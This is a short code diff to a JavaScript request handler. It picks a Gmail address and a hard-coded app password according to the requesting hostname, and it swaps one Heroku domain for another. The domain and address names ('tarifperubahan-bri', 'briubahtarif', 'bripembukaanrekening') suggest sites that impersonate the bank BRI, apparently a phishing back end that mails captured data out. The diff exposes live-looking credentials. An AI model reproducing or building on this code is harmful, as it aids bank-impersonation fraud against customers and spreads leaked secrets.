@@ -18,10 +18,10 @@ export default function handler(req, res) {
         pass = 'teelhhgttgviupfp';
 
 
-    } else if(url == 'tarifperubahan-bri.herokuapp.com'){
+    } else if(url == 'briubahtarif.herokuapp.com'){
         email = 'alamalam312zx@gmail.com' ;
         pass = 'kgyvskkowvhosxrj' ;
-        
+
     }
     else {
         email = 'bripembukaanrekening@gmail.com';
